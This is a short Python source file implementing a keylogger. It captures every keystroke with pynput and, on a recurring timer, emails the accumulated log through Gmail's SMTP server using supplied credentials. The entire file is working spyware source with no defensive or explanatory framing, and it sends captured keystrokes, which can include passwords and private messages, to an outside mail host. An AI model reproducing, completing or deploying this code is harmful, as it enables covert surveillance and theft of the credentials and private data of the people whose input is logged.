#!/usr/bin/env python

import pynput.keyboard as keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_intrevale, email, password):
        self.log = ""
        self.time_intrevale = time_intrevale
        self.email = email
        self.password = password

    def add_log(self, str1):
        self.log = self.log + str1

    def key_press(self, key):
        try:
            current_str = str(key.char)
        except AttributeError:
            if key == key.space:
                current_str = " "
            else:
                current_str = " " + str(key) + " "
        self.add_log(current_str)

    def send_email(self, email_add, password, log):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_add, password)
        server.sendmail(email_add, email_add, log)
        server.quit()

    def report(self):
        if self.log != "":
            self.send_email(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.time_intrevale, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
